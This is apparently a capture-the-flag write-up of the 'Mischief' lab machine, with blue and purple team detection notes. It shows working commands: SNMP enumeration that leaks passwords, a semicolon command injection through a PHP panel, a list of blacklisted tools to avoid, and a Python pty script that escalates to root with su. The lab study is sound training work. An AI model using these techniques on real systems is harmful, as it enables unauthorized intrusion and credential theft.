Target : 10.129.7.69

Date : 16/10/2026

```bash
> echo "10.129.7.69 mischief.htb" | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.
10.129.7.69 mischief.htb
```

We've got an Insane Linux box, and that hosts line landed. `getent hosts` answers `mischief.htb` for `10.129.7.69`. `tun0` is `10.10.15.181`.

```bash
> /usr/bin/nmap -Pn -sV -p 22,80,443,3366,8080,8443 --version-light 10.129.7.69
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-16 05:59 +0200
Nmap scan report for mischief.htb (10.129.7.69)
Host is up (0.039s latency).

PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   filtered http
443/tcp  filtered https
3366/tcp open     http       Python BaseHTTPServer http.server 2 or 3.0 - 3.1
8080/tcp filtered http-proxy
8443/tcp filtered https-alt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We've got `OpenSSH 7.6p1` on `22` and a `Python` `BaseHTTPServer` on `3366`. `80`, `443`, `8080`, and `8443` are filtered on IPv4. `/usr/bin/nmap -sU` quits here because UDP wants root, so we'll ask `SNMP` directly.

```bash
> snmpget -v1 -c public 10.129.7.69 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.5.0
iso.3.6.1.2.1.1.1.0 = STRING: "Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018"
iso.3.6.1.2.1.1.5.0 = STRING: "Mischief"
> snmpwalk -v1 -c public 10.129.7.69 HOST-RESOURCES-MIB::hrSWRunParameters
HOST-RESOURCES-MIB::hrSWRunParameters.839 = STRING: "-m SimpleHTTPAuthServer 3366 loki:[REDACTED] --dir /home/loki/hosted/"
```

We've got community `public`, kernel `4.15.0-20-generic`, and the `python` argv on `3366`. The user is `loki` and the password is on that command line. We'll log in before we touch the filtered web ports.

```bash
> curl -sS -u 'loki:[REDACTED]' http://10.129.7.69:3366/
<h1><strong>Credentials:</strong></h1>
	<tr>
		<td>loki</td>
		<td>[REDACTED]</td>
	</tr>
	<tr>
		<td>loki</td>
		<td>[REDACTED]</td>
	</tr>
```

We've got a second password for `loki`, `[REDACTED]`. We'll treat that page as static. `Apache` is running in the process table and it is not on those filtered IPv4 ports, so the listener is the other address in the `SNMP` IP table.

```bash
> snmpwalk -v1 -c public 10.129.7.69 1.3.6.1.2.1.4.34.1.3
IP-MIB::ipAddressIfIndex.ipv6."de:ad:be:ef:00:00:00:00:a0:de:ad:ff:fe:52:92:05" = INTEGER: 2
```

We've got `dead:beef::a0de:adff:fe52:9205`. The link-local is the same interface id. We'll talk to `Apache` on that global address.

```bash
> curl -sS -c /tmp/mischief.ck -b /tmp/mischief.ck --data 'user=administrator&password=[REDACTED]' 'http://[dead:beef::a0de:adff:fe52:9205]/login.php'
Welcome administrator
Command: <br>
<input type="text" name="command" value="ping -c 2 127.0.0.1">
<p>In my home directory, i have my password in a file called credentials, Mr Admin
```

We've got the command panel. We'll post `user`, not `username`, and `administrator` / `[REDACTED]` is the session. So the panel says the password sits in a file called `credentials` in the home directory. A bare `id` comes back empty because the `PHP` does `system("$cmd > /dev/null 2>&1")`. A trailing semicolon runs our command before that redirect.

```bash
> curl -sS -b /tmp/mischief.ck --data-urlencode 'command=id;' 'http://[dead:beef::a0de:adff:fe52:9205]/'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Command was executed succesfully!
> curl -sS -b /tmp/mischief.ck --data-urlencode 'command=cat /home/loki/cred*;' 'http://[dead:beef::a0de:adff:fe52:9205]/'
pass: [REDACTED]
```

We've got `www-data`, and `loki`'s password is `[REDACTED]`. We never send the word `credentials`. We've got a `strpos` blacklist, and `credentials` already contains `ls` and `dir`. Same trap on `.bash_history` (`bash`) and on `index.php` (`php`). We'll stay off `nc`, `bash`, `chown`, `setfacl`, `chmod`, `perl`, `find`, `locate`, `ls`, `php`, `wget`, `curl`, `dir`, `ftp`, and `telnet`.

```bash
> sshpass -p '[REDACTED]' ssh -o StrictHostKeyChecking=accept-new loki@10.129.7.69 'cat /home/loki/user.txt; echo; tail -n 20 /home/loki/.bash_history'
[REDACTED]

python -m SimpleHTTPAuthServer loki:[REDACTED]
```

We've got the user flag, `[REDACTED]`. And we got another password in that history line, `[REDACTED]`. We're only in group `loki`, so the 2018 `lxc` path is not ours. `getfacl` on `/bin/su` and `/usr/bin/sudo` is `user:loki:r--`. As `loki` we can read them and we cannot run them. As `www-data` we still can.

`su` reads the password from the tty, so a pipe prints nothing. We'll give it a `pty` from `python`, and we will not put a blacklisted token in that string.

```bash
> curl -sS -b /tmp/mischief.ck --data-urlencode 'command=python -c "import pty,os,select,time
pid,fd=pty.fork()
if pid==0:
 os.execvp(\"su\",[\"su\",\"-c\",\"id\"])
time.sleep(1)
os.write(fd,\"[REDACTED]\n\")
end=time.time()+4
while time.time()<end:
 r,_,_=select.select([fd],[],[],0.5)
 if fd in r:
  data=os.read(fd,4096)
  if not data: break
  print(repr(data))
";' 'http://[dead:beef::a0de:adff:fe52:9205]/'
'Password: '
'uid=0(root) gid=0(root) groups=0(root)'
```

We've got `uid=0`. `/root/root.txt` is the decoy. We'll read the real file under the `gcc` tree.

**Blue Team :**
We would hunt `SNMP` community `public` on `161/udp` for `hrSWRunParameters` that still carries a `user:password` on a `python` argv, then `HTTP` Basic to `3366` and a `POST` to `login.php` on `dead:beef::a0de:adff:fe52:9205`. The next hit is `www-data` running `id;` and `cat /home/loki/cred*;` through `/`, then `SSH` as `loki`, then `su` from that same `www-data` process. `root.txt` is read from `/usr/lib/gcc/x86_64-linux-gnu/7/root.txt`, not from `/root`.

**Purple Team :**
We stayed on the command line `SNMP` already printed, and we never sprayed the later passwords until the page or the history line showed them. The blacklist is a substring, so `credentials`, `.bash_history`, and `index.php` are blocked by accident, and a trailing `;` skips the `> /dev/null` the `PHP` appends. `loki` cannot execute `su` or `sudo` because the ACL is `r--` for that user, so the root password is only useful from `www-data`. The `lxd` group from the 2018 path is gone on this spawn. We did not need a callback. Our `tun0` v6 is `dead:beef:2::11b3/64` and we never bound it.

```bash
> curl -sS -b /tmp/mischief.ck --data-urlencode 'command=python -c "import pty,os,select,time
pid,fd=pty.fork()
if pid==0:
 os.execvp(\"su\",[\"su\",\"-c\",\"cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt; echo SEP; cat /root/root.txt\"])
time.sleep(1)
os.write(fd,\"[REDACTED]\n\")
end=time.time()+4
while time.time()<end:
 r,_,_=select.select([fd],[],[],0.5)
 if fd in r:
  data=os.read(fd,4096)
  if not data: break
  print(repr(data))
";' 'http://[dead:beef::a0de:adff:fe52:9205]/'
'[REDACTED]'
'SEP'
'The flag is not here, get a shell to find it!'
```

We've got `[REDACTED]`.
